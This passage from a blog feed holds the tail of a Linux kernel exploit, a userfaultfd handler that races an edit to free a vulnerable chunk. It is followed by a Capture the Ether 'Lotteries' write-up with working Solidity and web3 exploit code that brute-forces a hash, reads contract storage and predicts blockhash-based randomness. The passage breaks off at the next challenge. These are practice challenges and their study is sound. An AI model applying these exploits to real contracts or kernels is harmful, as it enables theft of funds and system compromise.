class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;regitser&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\t\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\t\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">// user code modify area</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x500</span>, zero);<span class=\"comment\">// 第一个edit free掉vuln chunk</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x400</span>, zero);<span class=\"comment\">// 第二个edit 确保size不变</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\t\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)zero;</span><br><span class=\"line\">\t\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\t\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\t\tuc.mode = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;ioctl done&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "Kernel state"
            ]
        },
        {
            "id": "https://squirre17.github.io/2022/09/02/Capture-the-ether-Lotteries-wp/",
            "url": "https://squirre17.github.io/2022/09/02/Capture-the-ether-Lotteries-wp/",
            "title": "Capture-the-ether-Lotteries-wp",
            "date_published": "2022-09-02T03:23:12.000Z",
            "content_html": "<h2 id=\"guess-the-secret-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-secret-number\">#</a> Guess the secret number</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheSecretNumberChallenge &#123;</span><br><span class=\"line\">    bytes32 answerHash = <span class=\"number\">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">GuessTheSecretNumberChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">guess</span><span class=\"params\">(uint8 n)</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (keccak256(n) == answerHash) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题外话 这里是低版本的构造函数 需要创建的时候就打一个 ether</p>\n<p>8 位的 keccak<br>\n 爆破即可</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract solution&#123;</span><br><span class=\"line\">    bytes32 answerHash = <span class=\"number\">0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365</span>;</span><br><span class=\"line\">    uint public x;</span><br><span class=\"line\">    function <span class=\"title function_\">answer</span><span class=\"params\">()</span> public <span class=\"title function_\">returns</span><span class=\"params\">(uint8)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(uint8 i = <span class=\"number\">0</span> ; i &lt; <span class=\"number\">2</span>**<span class=\"number\">8</span> ; i++)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(keccak256(i) == answerHash)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                x = i;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">2</span>**<span class=\"number\">8</span><span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-the-random-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-random-number\">#</a> Guess the random number</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheRandomNumberChallenge &#123;</span><br><span class=\"line\">    uint8 answer;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">GuessTheRandomNumberChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">        answer = uint8(keccak256(block.blockhash(block.number - <span class=\"number\">1</span>), now));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">guess</span><span class=\"params\">(uint8 n)</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (n == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个合约有点老了<br>\n In short  <code>now</code>  is just an alias for  <code>block.timestamp</code> <br>\n 如果在 remix 上部署需要改一下 <code>block.number - 1</code>  不然会 pending<br>\n <code>block.blockhash()</code>  is now  <code>blockhash()</code>  and  <code>now</code>  is  <code>block.timestamp</code> . We’ll see this further on.</p>\n<p>timestamp 和 block 信息都在区块链探索器上可见</p>\n<p><img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/1.png\" alt></p>\n<p><img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/2.png\" alt><br>\ntimestamp <a href=\"https://www.epochconverter.com/\">Epoch Converter - Unix Timestamp Converter</a><br>\n 我想用 <code>interface</code>  与合约交互 结果失败了（不知道原因<br>\n<a href=\"https://betterprogramming.pub/capture-the-ether-guess-the-random-number-2ebb8c9c0347\"> Capture Ether: Guess the Random Number on a Smart Contract | by Tomás | Better Programming</a></p>\n<p>所以还是手撸<br>\n直接读取 Storage 不香吗 (也可以写个 solidity 的 exp 用 interface 来交互)</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> ethers = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;ethers&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">const</span> fs = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;fs-extra&#x27;</span>)</span><br><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">&#x27;dotenv&#x27;</span>).<span class=\"title function_\">config</span>()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> <span class=\"title class_\">Web3</span> = <span class=\"built_in\">require</span>(<span class=\"string\">&#x27;web3&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">var</span> web3 =  <span class=\"keyword\">new</span> <span class=\"title class_\">Web3</span>(<span class=\"string\">&quot;your_rpc_url&quot;</span>)</span><br><span class=\"line\">contractAddr = <span class=\"string\">&quot;your_contract_addr&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"title function_\">cl</span> = x =&gt; <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(x)</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">padding</span>(<span class=\"params\">x</span>) &#123;</span><br><span class=\"line\">\tx = x.<span class=\"title function_\">toString</span>()</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> s = <span class=\"string\">&quot;0x&quot;</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; (<span class=\"number\">64</span> - x.<span class=\"property\">length</span>); i++) &#123;</span><br><span class=\"line\">\t\ts += <span class=\"string\">&quot;0&quot;</span></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\ts += x</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> s</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getSlot</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">eth</span>.<span class=\"title function_\">getStorageAt</span>(contractAddr, idx)</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">getShaIdx</span>(<span class=\"params\">idx</span>)&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">let</span> ret = <span class=\"keyword\">await</span> web3.<span class=\"property\">utils</span>.<span class=\"title function_\">sha3</span>(<span class=\"title function_\">padding</span>(idx))</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ret</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">main</span>(<span class=\"params\"></span>)&#123;</span><br><span class=\"line\">\t<span class=\"title function_\">cl</span>(<span class=\"keyword\">await</span> <span class=\"title function_\">getSlot</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">main</span>()</span><br><span class=\"line\">\t.<span class=\"title function_\">then</span>(<span class=\"function\">() =&gt;</span> process.<span class=\"title function_\">exit</span>(<span class=\"number\">0</span>))</span><br><span class=\"line\">\t.<span class=\"title function_\">catch</span>(<span class=\"function\">(<span class=\"params\">err</span>) =&gt;</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(err),</span><br><span class=\"line\">\t\tprocess.<span class=\"title function_\">exit</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#125;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"guess-the-new-number\"><a class=\"markdownIt-Anchor\" href=\"#guess-the-new-number\">#</a> Guess the new number</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract GuessTheNewNumberChallenge &#123;</span><br><span class=\"line\">    function <span class=\"title function_\">GuessTheNewNumberChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">guess</span><span class=\"params\">(uint8 n)</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">        uint8 answer = uint8(keccak256(block.blockhash(block.number - <span class=\"number\">1</span>), now));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (n == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>没法在内存看了 只能嗯计算<br>\n关于 now 关键字<a href=\"https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=block#block-and-transaction-properties\"> documentation</a><br>\n 就是 timestamp</p>\n<p>根据 upon 大佬提醒 blockhash 只在 256 个块之内生效 所以两个块的布置不能间隔太久<br>\n否则 blockhash 就会返回 0<br>\n 而且 blockhash 是计算块 hash 如果本地的链没那么长是没法计算的</p>\n<p>如果我们可以在生成第二个区块钱同时执行 exp 合约和目标合约 那么结果也是一样的<br>\n因为 answer 是调用时才生成<br>\n直接写个 sol 交互</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.8</span><span class=\"number\">.0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">interface Challenge &#123;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">guess</span><span class=\"params\">(uint8 n)</span> external payable;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract <span class=\"built_in\">exp</span>&#123;</span><br><span class=\"line\">\tChallenge public cha;</span><br><span class=\"line\">\tconstructor(address addr)&#123;</span><br><span class=\"line\">\t\tcha = Challenge(addr);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">solve</span><span class=\"params\">()</span> public payable&#123;</span><br><span class=\"line\">\t\tuint8 ans = uint8(uint256(keccak256(abi.encodePacked(</span><br><span class=\"line\">\t\t\tblockhash(block.number - <span class=\"number\">1</span>), block.timestamp</span><br><span class=\"line\">\t\t))));</span><br><span class=\"line\">\t\tcha.guess&#123;value: <span class=\"number\">1</span> ether&#125;(ans);</span><br><span class=\"line\">\t\tpayable(msg.sender).transfer(address(this).balance);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treceive() external payable&#123;&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>注意 一定要将此合约的钱转出<br>\n <code>payable(msg.sender).transfer(address(this).balance);</code> <br>\n 另外一定要有 <code>receive</code>  函数 （没 function ） 来确保有钱转入</p>\n<h2 id=\"predict-the-future\"><a class=\"markdownIt-Anchor\" href=\"#predict-the-future\">#</a> Predict the future</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">contract PredictTheFutureChallenge &#123;</span><br><span class=\"line\">    address guesser;</span><br><span class=\"line\">    uint8 guess;</span><br><span class=\"line\">    uint256 settlementBlockNumber;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">PredictTheFutureChallenge</span><span class=\"params\">()</span> public payable &#123;</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">isComplete</span><span class=\"params\">()</span> public view <span class=\"title function_\">returns</span> <span class=\"params\">(<span class=\"type\">bool</span>)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> address(this).balance == <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">lockInGuess</span><span class=\"params\">(uint8 n)</span> public payable &#123;</span><br><span class=\"line\">        require(guesser == <span class=\"number\">0</span>);</span><br><span class=\"line\">        require(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = msg.sender;</span><br><span class=\"line\">        guess = n;</span><br><span class=\"line\">        settlementBlockNumber = block.number + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function <span class=\"title function_\">settle</span><span class=\"params\">()</span> public &#123;</span><br><span class=\"line\">        require(msg.sender == guesser);</span><br><span class=\"line\">        require(block.number &gt; settlementBlockNumber);</span><br><span class=\"line\"></span><br><span class=\"line\">        uint8 answer = uint8(keccak256(block.blockhash(block.number - <span class=\"number\">1</span>), now)) % <span class=\"number\">10</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        guesser = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (guess == answer) &#123;</span><br><span class=\"line\">            msg.sender.transfer(<span class=\"number\">2</span> ether);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>也就是我们先要用 <code>lockInGuess</code>  设置 guess 值<br>\n然后等待 block 增加了 用之前写入的去预测到增加后的块数</p>\n<p>但是之后的块数和时间都是可以预测的 并且只有十种可能性<br>\n也就是我们可以等到 answer 满足我们的 guess 的时候再调用 <code>settle</code></p>\n<p>注意 如果出现 <code># Transaction mined but execution failed</code> <br>\n 一定要改 matemask 的 gas limit<br>\n 不然查 txn 会查出 gas 超了<br>\n<img src=\"/2022/09/02/Capture-the-ether-Lotteries-wp/3.png\" alt><br>\n这个是借助中介合约一个个试 如果成功了就才调用 solve</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^<span class=\"number\">0.4</span><span class=\"number\">.21</span>;</span><br><span class=\"line\">import <span class=\"string\">&quot;./challenge.sol&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">contract <span class=\"built_in\">exp</span>&#123;</span><br><span class=\"line\">\taddress owner;</span><br><span class=\"line\">\tPredictTheFutureChallenge public cha;</span><br><span class=\"line\">\tuint8 public n;</span><br><span class=\"line\">\t<span class=\"type\">bool</span> public success;</span><br><span class=\"line\">\tuint8 public answer;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">exp</span><span class=\"params\">(address addr)</span> public &#123;</span><br><span class=\"line\">\t\towner = msg.sender;</span><br><span class=\"line\">\t\tcha = PredictTheFutureChallenge(addr);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">lockNumber</span><span class=\"params\">(uint8 _n)</span> public payable&#123;</span><br><span class=\"line\">\t\trequire(msg.value == <span class=\"number\">1</span> ether);</span><br><span class=\"line\">\t\trequire(_n &lt;= <span class=\"number\">9</span> &amp;&amp; _n &gt;= <span class=\"number\">0</span>);</span><br><span class=\"line\">\t\tn = _n;</span><br><span class=\"line\">\t\tcha.lockInGuess.value(msg.value)(_n);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">transfer</span><span class=\"params\">()</span> external payable &#123;</span><br><span class=\"line\">\t\taddress(this).transfer(msg.value);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">solve</span><span class=\"params\">()</span> public payable&#123;</span><br><span class=\"line\">\t\tanswer = uint8(uint256(keccak256(</span><br><span class=\"line\">\t\t\tabi.encodePacked(</span><br><span class=\"line\">\t\t\t\tblock.blockhash(block.number - <span class=\"number\">1</span>), now</span><br><span class=\"line\">\t\t\t)</span><br><span class=\"line\">\t\t))) % <span class=\"number\">10</span> ;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(answer == n)&#123;</span><br><span class=\"line\">\t\t\tsuccess = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t\tcha.settle();</span><br><span class=\"line\">\t\t\t<span class=\"comment\">// require(cha.isComplete(), &quot;Wrong answer&quot;);</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction <span class=\"title function_\">withdraw</span><span class=\"params\">()</span> external payable&#123;</span><br><span class=\"line\">\t\trequire(msg.sender == owner);</span><br><span class=\"line\">\t\towner.transfer(address(this).balance);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tfunction() public payable &#123;&#125;</span><br><span class=\"line\">\t<span class=\"comment\">// receive external payable&#123;&#125;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"predict-the-block-hash\"><a class=\"markdownIt-Anchor\" href=\"#predict-the-block-hash\">#</a> Predict the block hash</h2>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span 